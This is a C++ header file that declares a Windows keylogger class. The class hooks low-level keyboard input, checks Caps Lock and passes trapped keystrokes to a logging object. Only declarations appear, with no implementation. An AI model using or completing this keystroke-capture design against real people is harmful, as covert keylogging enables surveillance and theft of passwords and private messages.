/**
  * @file KeyLogger.h
  * @author Daniel Amodio
  * @date May 1, 2009
  * @class KeyLogger
  *
  * KeyLogger class will actually facilitate the trapping of any keystrokes.
  * The constructor will be passed a pointer to the DataLog object, so that 
  * both the myhook.cpp, and the KeyLogger class have access to it.
  * When any information is caught, the data will be passed from the KeyLogger
  * to the DataLog. Instances where the main file would need access would be
  * to put a timestamp at startup, or something along those lines.
  *
  */

#ifndef KEYLOGGER_H

#include "DataLog.h"
#include <windows.h>

class KeyLogger
{
public:
       /**
         * Overloaded constructor to accept LogType
         * @param newLogType LogType to pass to DataLog object
         */
       KeyLogger(LogTypeName newLogType);
       
       /**
         * Overloaded constructor to accept pointer to DataLog object
         * @param newDataLog pointer to new DataLog object
         */
       KeyLogger(DataLog &newDataLog);

       /**
         * Function to setup keyboard hook
         */
       void hookIt(void);
       
       /**
         * Actuall callback function for keyboard hook
         */
       LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
       
       /**
         * Wrapper for callback function (keyboard hook)
         * necissary for non-static function
         */
       static LRESULT CALLBACK LowLevelKeyboardProcWrapper( int nCode, WPARAM wParam, LPARAM lParam );
       
       
private:
        /**
          * DataLog object, to send data that is trapped
          */
        DataLog *datalog;
        
        /**
          * Pointer to KeyLogger object (necissary for callback function)
          */
        static KeyLogger *objPointer;
        
        /**
          * Function to check whether Caps Lock is on or off
          */
        bool isCapsLock();
        
        /**
          * Function to calculate logical xor
          * @param p - first argument
          * @param q - second argument
          */
        bool logicalXOR(bool p, bool q);
};

#define KEYLOGGER_H
#endif

